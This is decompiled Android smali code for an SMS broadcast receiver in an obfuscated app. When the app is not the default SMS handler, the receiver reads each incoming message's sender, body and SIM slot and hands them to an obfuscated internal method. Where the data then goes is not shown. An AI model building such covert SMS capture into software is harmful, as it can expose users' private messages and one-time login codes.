.class public final Lcom/devstudio/plus/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "r8-map-id-4f946035ae8b5dc8dc2611fa1065f2bff5a861868bbaf6a3ac203acc3f2498b4"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 2
    .line 3
    .line 4
    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    .line 1
    :try_start_0
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    .line 6
    .line 7
    invoke-static {v0, v1}, Lh1/m;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 8
    .line 9
    .line 10
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 11
    if-nez v0, :cond_0

    .line 12
    .line 13
    goto/16 :goto_6

    .line 14
    .line 15
    :cond_0
    const/4 v0, 0x0

    .line 16
    :try_start_1
    invoke-static {p1}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object v1

    .line 20
    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 21
    .line 22
    .line 23
    move-result-object v2

    .line 24
    invoke-static {v1, v2}, Lh1/m;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 25
    .line 26
    .line 27
    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 28
    goto :goto_0

    .line 29
    :catch_0
    move v1, v0

    .line 30
    :goto_0
    if-eqz v1, :cond_1

    .line 31
    .line 32
    goto/16 :goto_6

    .line 33
    .line 34
    :cond_1
    :try_start_2
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    .line 35
    .line 36
    .line 37
    move-result-object v1

    .line 38
    const/4 v2, 0x0

    .line 39
    if-eqz v1, :cond_2

    .line 40
    .line 41
    const-string v3, "pdus"

    .line 42
    .line 43
    invoke-virtual {v1, v3}, Landroid/os/BaseBundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    .line 44
    .line 45
    .line 46
    move-result-object v1

    .line 47
    goto :goto_1

    .line 48
    :cond_2
    move-object v1, v2

    .line 49
    :goto_1
    instance-of v3, v1, [Ljava/lang/Object;

    .line 50
    .line 51
    if-eqz v3, :cond_3

    .line 52
    .line 53
    check-cast v1, [Ljava/lang/Object;

    .line 54
    .line 55
    goto :goto_2

    .line 56
    :cond_3
    move-object v1, v2

    .line 57
    :goto_2
    if-nez v1, :cond_4

    .line 58
    .line 59
    goto/16 :goto_6

    .line 60
    .line 61
    :cond_4
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    .line 62
    .line 63
    .line 64
    move-result-object v3

    .line 65
    if-eqz v3, :cond_5

    .line 66
    .line 67
    const-string v4, "format"

    .line 68
    .line 69
    invoke-virtual {v3, v4}, Landroid/os/BaseBundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    .line 70
    .line 71
    .line 72
    move-result-object v3

    .line 73
    if-nez v3, :cond_6

    .line 74
    .line 75
    :cond_5
    const-string v3, "3gpp"

    .line 76
    .line 77
    :cond_6
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    .line 78
    .line 79
    .line 80
    move-result-object p2

    .line 81
    const/4 v4, -0x1

    .line 82
    if-eqz p2, :cond_7

    .line 83
    .line 84
    const-string v5, "subscription"

    .line 85
    .line 86
    invoke-virtual {p2, v5, v4}, Landroid/os/BaseBundle;->getInt(Ljava/lang/String;I)I

    .line 87
    .line 88
    .line 89
    move-result v4
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 90
    :cond_7
    if-gez v4, :cond_9

    .line 91
    .line 92
    :catch_1
    :cond_8
    move p1, v0

    .line 93
    goto :goto_3

    .line 94
    :cond_9
    :try_start_3
    const-string p2, "telephony_subscription_service"

    .line 95
    .line 96
    invoke-virtual {p1, p2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 97
    .line 98
    .line 99
    move-result-object p1

    .line 100
    instance-of p2, p1, Landroid/telephony/SubscriptionManager;

    .line 101
    .line 102
    if-eqz p2, :cond_a

    .line 103
    .line 104
    move-object v2, p1

    .line 105
    check-cast v2, Landroid/telephony/SubscriptionManager;

    .line 106
    .line 107
    :cond_a
    if-eqz v2, :cond_8

    .line 108
    .line 109
    invoke-virtual {v2, v4}, Landroid/telephony/SubscriptionManager;->getActiveSubscriptionInfo(I)Landroid/telephony/SubscriptionInfo;

    .line 110
    .line 111
    .line 112
    move-result-object p1

    .line 113
    if-eqz p1, :cond_8

    .line 114
    .line 115
    invoke-virtual {p1}, Landroid/telephony/SubscriptionInfo;->getSimSlotIndex()I

    .line 116
    .line 117
    .line 118
    move-result p1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 119
    :goto_3
    :try_start_4
    new-instance p2, Ljava/lang/StringBuilder;

    .line 120
    .line 121
    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    .line 122
    .line 123
    .line 124
    array-length v2, v1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 125
    const-string v4, ""

    .line 126
    .line 127
    move-object v5, v4

    .line 128
    :goto_4
    if-ge v0, v2, :cond_e

    .line 129
    .line 130
    :try_start_5
    aget-object v6, v1, v0

    .line 131
    .line 132
    check-cast v6, [B

    .line 133
    .line 134
    invoke-static {v6, v3}, Landroid/telephony/SmsMessage;->createFromPdu([BLjava/lang/String;)Landroid/telephony/SmsMessage;

    .line 135
    .line 136
    .line 137
    move-result-object v6

    .line 138
    if-nez v6, :cond_b

    .line 139
    .line 140
    goto :goto_5

    .line 141
    :cond_b
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    .line 142
    .line 143
    .line 144
    move-result v7

    .line 145
    if-nez v7, :cond_c

    .line 146
    .line 147
    invoke-virtual {v6}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    .line 148
    .line 149
    .line 150
    move-result-object v5

    .line 151
    if-nez v5, :cond_c

    .line 152
    .line 153
    move-object v5, v4

    .line 154
    :cond_c
    invoke-virtual {v6}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    .line 155
    .line 156
    .line 157
    move-result-object v6

    .line 158
    if-nez v6, :cond_d

    .line 159
    .line 160
    move-object v6, v4

    .line 161
    :cond_d
    invoke-virtual {p2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 162
    .line 163
    .line 164
    :goto_5
    add-int/lit8 v0, v0, 0x1

    .line 165
    .line 166
    goto :goto_4

    .line 167
    :cond_e
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->length()I

    .line 168
    .line 169
    .line 170
    move-result v0

    .line 171
    if-lez v0, :cond_f

    .line 172
    .line 173
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    .line 174
    .line 175
    .line 176
    move-result v0

    .line 177
    if-lez v0, :cond_f

    .line 178
    .line 179
    sget-object v0, Lp0/j;->a:Lp0/j;

    .line 180
    .line 181
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 182
    .line 183
    .line 184
    move-result-object p2

    .line 185
    invoke-virtual {v0, v5, p2, p1}, Lp0/j;->a(Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    .line 186
    .line 187
    .line 188
    :catch_2
    :cond_f
    :goto_6
    return-void
.end method
